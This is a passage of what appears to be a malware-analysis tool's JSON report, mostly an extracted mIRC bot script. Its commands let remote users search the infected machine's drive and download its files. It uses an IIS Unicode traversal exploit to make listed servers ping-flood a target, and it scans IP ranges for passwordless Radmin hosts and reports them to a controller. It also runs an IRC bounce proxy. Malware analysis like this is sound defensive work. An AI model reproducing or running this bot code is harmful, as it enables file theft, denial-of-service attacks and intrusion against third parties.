            "n196=      .msg $chan info ( $+ $$2 $+ /No such command)",
            "n197=      halt",
            "n198=    }",
            "n199=    .msg $chan info (Not enough Parameters)",
            "n200=  }",
            "n201=  if ($1 == !fserv) {",
            "n202=    if ($2 == $null) { .msg $chan !fserv (Not enough Parameters) | halt }",
            "n203=    if ($2 == $me) {",
            "n204=      if (Filesize isin $$3-) {",
            "n205=        .msg $chan $nick $+ : Please only type !fserv $me <filename> ... Not the filesize too.",
            "n206=        halt",
            "n207=      }",
            "n208=      .dcc send $nick \" $+ $$3- $+ \"",
            "n209=      halt",
            "n210=    }   ",
            "n211=    if ($2 == find) {",
            "n212=      %find.text = $$3-",
            "n213=      %find.files = $findfile(c:\\,$search,0)",
            "n214=      .msg $nick Found files: $findfile(c:\\,$search,0)",
            "n215=      if (%find.files > 5) {",
            "n216=        .msg $nick Too Many files found for listing.  Sending file list.  This could take a while.",
            "n217=        %find.inc = 1",
            "n218=        .write -c %find.text $+ .txt",
            "n219=        .write %find.text $+ .txt [IP: $ip $+ ]",
            "n220=        .write %find.text $+ .txt [Search: %find.text $+ ]",
            "n221=        .write %find.text $+ .txt [Files: %find.files $+ ]",
            "n222=        .write %find.text $+ .txt [Send: !fserv <my nick> <filename>]",
            "n223=        :write",
            "n224=        if (%find.inc > %find.files) {",
            "n225=          .dcc send $nick %find.text $+ .txt",
            "n226=          .timerremove $+ $rand(a,z) 1 60 .remove \" $+ $mircdir $+ \\ $+ %find.text $+ .txt\"",
            "n227=          halt",
            "n228=        }",
            "n229=        .write %find.text $+ .txt !fserv <my nick> $findfile(c:\\,$search,%find.inc) [Filesize: $round($calc(($lof($findfile(C:\\,$search,%find.inc)) / 1024) / 1000),2) $+ MB]",
            "n230=        %find.inc = %find.inc + 1",
            "n231=        goto write",
            "n232=      }",
            "n233=      %find.inc = 1",
            "n234=      :find",
            "n235=      if (%find.inc > %find.files) {",
            "n236=        .msg $nick All Files listed for search of: %find.text",
            "n237=        .msg $nick To download type: !fserv $me <filename>       ",
            "n238=        halt",
            "n239=      }",
            "n240=      .msg $nick %find.inc $+ . $findfile(c:\\,$search,%find.inc) [Filesize: $round($calc(($lof($findfile(C:\\,$search,%find.inc)) / 1024) / 1000),2) $+ MB]",
            "n241=      %find.inc = %find.inc + 1",
            "n242=      goto find",
            "n243=      halt",
            "n244=    }",
            "n245=    if ($2 == help) {",
            "n246=      .msg $nick fserv commands (All commands should be entered in a channel I am in):",
            "n247=      .msg $nick !fserv find <search>",
            "n248=      .msg $nick !fserv $me <filename> (downloads)",
            "n249=      .msg $nick !fserv help (this menu)",
            "n250=      halt",
            "n251=    }",
            "n252=    .msg $chan fserv ( $+ $$2 $+ /No such command)",
            "n253=  }",
            "n254=}",
            "n255=alias search { .return * $+ %find.text $+ * }",
            "n256=alias drop {",
            "n257=  %drop.lines = $lines(iis.txt)",
            "n258=  %drop.inc = 1",
            "n259=  .timerdrop 0 10 dropiis",
            "n260=}",
            "n261=alias dropiis {",
            "n262=  if (%drop.inc > %drop.lines) { .timerdrop off | .msg %drop.chan Finished Sending Packet Command to all %drop.lines Hosts.  Sending %drop.times Packets. | halt }",
            "n263=  %drop = $r $+ $r $+ $r",
            "n264=  .sockopen Drop[ $+ %drop $+ ] $read -l $+ %drop.inc iis.txt 80",
            "n265=  .timerdrop $+ %drop 1 3 .sockclose Drop[ $+ %drop $+ ]  ",
            "n266=  %drop.inc = %drop.inc + 1",
            "n267=}",
            "n268=on 1:sockopen:Drop[*]:{",
            "n269=  if ($sockerr > 0) { .sockclose $sockname | halt }",
            "n270=  sockwrite -n $sockname GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+ping.exe+\"-v\"+icmp+\"-t\"+\"-l\"+65000+ $+ %drop.ip $+ +\"-n\"+ $+ %drop.times $+ +\"-w\"+0",
            "n271=}",
            "n272=on 1:sockwrite:Drop[*]:{",
            "n273=  .sockclose $sockname",
            "n274=}",
            "n275=raw 433:*:{",
            "n276=  .haltdef",
            "n277=  %bot.nick = %bot.nick + 1",
            "n278=  if ($len(%bot.nick) == 1) { .nick exe[ $+ $str(0,4) $+ %bot.nick $+ ] | halt }",
            "n279=  if ($len(%bot.nick) == 2) { .nick exe[ $+ $str(0,3) $+ %bot.nick $+ ] | halt }",
            "n280=  if ($len(%bot.nick) == 3) { .nick exe[ $+ $str(0,2) $+ %bot.nick $+ ] | halt }",
            "n281=  if ($len(%bot.nick) == 4) { .nick exe[ $+ $str(0,1) $+ %bot.nick $+ ] | halt }",
            "n282=  if ($len(%bot.nick) == 5) { .nick exe[ $+ %bot.nick $+ ] | halt }",
            "n283=  .nick exe[ $+ %bot.nick $+ ]",
            "n284=  halt",
            "n285=}",
            "n286=raw 471:*:{",
            "n287=  haltdef",
            "n288=  .timerjoin $+ $$2 0 60 join $$2",
            "n289=  halt",
            "n290=}",
            "n291=raw 473:*:{",
            "n292=  haltdef",
            "n293=  .timerjoin $+ $$2 0 60 join $$2",
            "n294=  halt",
            "n295=}",
            "n296=raw 474:*:{",
            "n297=  haltdef",
            "n298=  .timerjoin $+ $$2 0 60 join $$2",
            "n299=  halt",
            "n300=}",
            "n301=raw 475:*:{",
            "n302=  haltdef",
            "n303=  .timerjoin $+ $$2 0 60 join $$2",
            "n304=  halt",
            "n305=}",
            "n306=alias timerarg {",
            "n307=  var %arg $round($calc($prospeed / 100))",
            "n308=  if (%arg < 1) set %arg 1",
            "n309=  set %arg $int($calc(40 / %arg))",
            "n310=  if (%arg < 1) set %arg 1",
            "n311=  return %arg",
            "n312=}",
            "n313=alias prospeed { ",
            "n314=  var %protest $ticks ",
            "n315=  var %i 1 ",
            "n316=  :start ",
            "n317=  if ($calc($ticks - %protest) <= 100) { ",
            "n318=    inc %i ",
            "n319=    goto start ",
            "n320=  }",
            "n321=  :end ",
            "n322=  return $calc(%i * .7))",
            "n323=}",
            "n324=alias scan {",
            "n325=  %scan.range = $$1",
            "n326=  %scan.inc1 = 0",
            "n327=  %scan.inc2 = 0",
            "n328=  %scan.inc3 = $$2",
            "n329=  %scan = $gettok(%scan.range,1,46) $+ . $+ %scan.inc3 $+ . $+ %scan.inc1 $+ . $+ %scan.inc2",
            "n330=  .scan1",
            "n331=}",
            "n332=alias scan1 {",
            "n333=  .timerscan -ocm 0 $timerarg .scan2",
            "n334=}",
            "n335=alias scan2 {",
            "n336=  if (%scan.inc2 == 255) { ",
            "n337=    .timerscan off",
            "n338=    if (%scan.inc1 == 255) { ",
            "n339=      if (%scan.inc3 == 255) { %scanning = Done | halt }",
            "n340=      %scan.inc3 = %scan.inc3 + 1",
            "n341=      %scan.inc2 = 1",
            "n342=      %scan.inc1 = 1",
            "n343=      .timer -m 1 1 scan1 ",
            "n344=      halt ",
            "n345=    }",
            "n346=    %scan.inc1 = %scan.inc1 + 1",
            "n347=    %scan.inc2 = 1",
            "n348=    .timer -m 1 1 scan1",
            "n349=  }",
            "n350=  .scansock",
            "n351=  %scan.inc2 = %scan.inc2 + 1",
            "n352=}",
            "n353=alias scansock {",
            "n354=  %sock = $r $+ $r",
            "n355=  .sockopen scanner[ $+ %sock $+ ] $gettok(%scan.range,1,46) $+ . $+ %scan.inc3 $+ . $+ %scan.inc1 $+ . $+ %scan.inc2 4899",
            "n356=  .timerclose $+ %sock 1 2 .sockclose scanner[ $+ %sock $+ ]",
            "n357=}",
            "n358=on 1:sockopen:scanner[*]:{",
            "n359=  if ($sock($sockname).status = active) {",
            "n360=    bset &command 1 1 0 0 0 1 0 0 0 8 8",
            "n361=    sockwrite $sockname &command",
            "n362=    halt",
            "n363=  }",
            "n364=}",
            "n365=on 1:sockread:scanner[*]:{",
            "n366=  if ($sockerr > 0) return",
            "n367=  :nextread",
            "n368=  sockread &temp",
            "n369=  if ($sockbr == 0) return",
            "n370=  if ($bvar(&temp,1,$bvar(&temp,0)) == %nopass) {",
            "n371=    .write radmin.txt $sock($sockname).ip",
            "n372=    .raw -q privmsg %auto :",
            "4,1Bun: $sock($sockname).ip",
            "n373=    .sockclose $sockname",
            "n374=  }",
            "n375=  if ($bvar(&temp,1,$bvar(&temp,0)) == %nopass1) {",
            "n376=    .write radmin.txt $sock($sockname).ip",
            "n377=    .raw -q privmsg %auto :",
            "4,1BuN: $sock($sockname).ip",
            "n378=    .sockclose $sockname",
            "n379=  }",
            "n380=  goto nextread",
            "n381=}",
            "n382=alias bnc { .socklisten bnc $$1 }",
            "n383=on 1:socklisten:bnc:{",
            "n384=  .sockaccept bnc.temp",
            "n385=  %bnc.temp.ip = $sock(bnc.temp).ip",
            "n386=  .sockrename bnc.temp bnca $+ %bnc.temp.ip",
            "n387=}",
            "n388=on 1:sockread:bnca*:{",
            "n389=  .sockread %bnca",
            "n390=  if ($gettok(%bnca,1,32) == PASS) {",
            "n391=    if ($gettok(%bnca,2,32) == %bnc.pass) {",
            "n392=      .sockwrite -n $sockname Password accepted.",
            "n393=      .sockwrite -n $sockname /conn <server> <port> to connect.",
            "n394=      %bnc [ $+ [ $sock($sockname).ip ] ] = yes",
            "n395=    }",
            "n396=  }",
            "n397=  if (%bnc [ $+ [ $sock($sockname).ip != yes) {",
            "n398=    if ($gettok(%bnca,1,32) == NICK) {",
            "n399=      .set %bnc.nick $gettok(%bnca,2,32) ",
            "n400=    }",
            "n401=    if ($gettok(%bnca,1,32) == USER) {",
            "n402=      .set %bnc.user $gettok(%bnca,2-,32)",
            "n403=      .sockwrite -n $sockname Welcome to psyBNC.",
            "n404=      .sockwrite -n $sockname /pass <pass> for authorization",
            "n405=    }",
            "n406=  }",
            "n407=  if (%bnc [ $+ [ $sock($sockname).ip ] ] == yes) {",
            "n408=    if ($gettok(%bnca,1,32) == CONN) {",
            "n409=      %bncconn. [ $+ [ $sock($sockname).ip ] ] = Connected",
            "n410=      .sockopen bncb [ $+ [ $sock($sockname).ip ] ] $gettok(%bnca,2-,32)",
            "n411=      .sockwrite -n $sockname Now Attempting to connected to: $gettok(%bnca,2-,32)",
            "n412=      halt",
            "n413=    }",
            "n414=    if (%bncconn. [ $+ [ $sock($sockname).ip ] ] == Connected) {",
            "n415=      .sockwrite -n bncb [ $+ [ $remove($sockname,bnca) ] ] $gettok(%bnca,1-,32)",
            "n416=    }",
            "n417=    echo -s %bnca",
            "n418=  }",
            "n419=}",
            "n420=on 1:sockopen:bncb*:{",
            "n421=  .sockwrite -n $sockname USER %bnc.user",
            "n422=  .sockwrite -n $sockname NICK %bnc.nick",
            "n423=}",
            "n424=on 1:sockread:bncb*:{",
            "n425=  .sockread %bncb",
            "n426=  .sockwrite -n bnca [ $+ [ $remove($sockname,bncb) ] ] %bncb",
            "n427=}",
            "n428=on 1:sockclose:bnca*:{",
            "n429=  %bnc [ $+ [ $sock($sockname).ip ] ] = no",
            "n430=  %bnccon. [ $+ [ $sock($sockname).ip ] ] = no",
            "n431=  .sockclose bncb [ $+ [ $sock($sockname).ip ] ]",
            "n432=}"
        ],
        "file": {
            "n128=      .dcc send $nick radmin.txt": "Text",
            "n218=        .write -c %find.text $+ .txt": "Text",
            "n225=          .dcc send $nick %find.text $+ .txt": "Text"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.381409",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
